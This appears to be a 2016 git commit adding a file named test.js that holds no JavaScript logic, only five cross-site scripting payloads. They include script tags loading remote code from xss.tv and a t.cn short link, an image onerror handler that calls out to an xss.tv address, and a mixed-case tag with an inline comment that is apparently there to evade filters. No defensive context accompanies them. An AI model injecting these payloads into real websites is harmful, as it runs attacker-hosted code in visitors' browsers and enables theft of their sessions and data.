8b06500501950189bdb5ef470d6f285e9a2fd81f
FalconSecurity <securlty@163.com>
2016-05-21 00:18:50 +0800

    Create test.js

---
+++ test.js
@@ -0,0 +1,5 @@
+<scrip>alert('xss')</script>
+</script><script src=http://xss.tv/rBBuXa></script>
+<script src=http://t.cn/R5v2SAy></script>
+<img src=1 onerror=$.get('http://xss.tv/dTQ19c')>
+<ScRiPt/**/src=http://t.cn/R5v2SAy></ScRiPt>
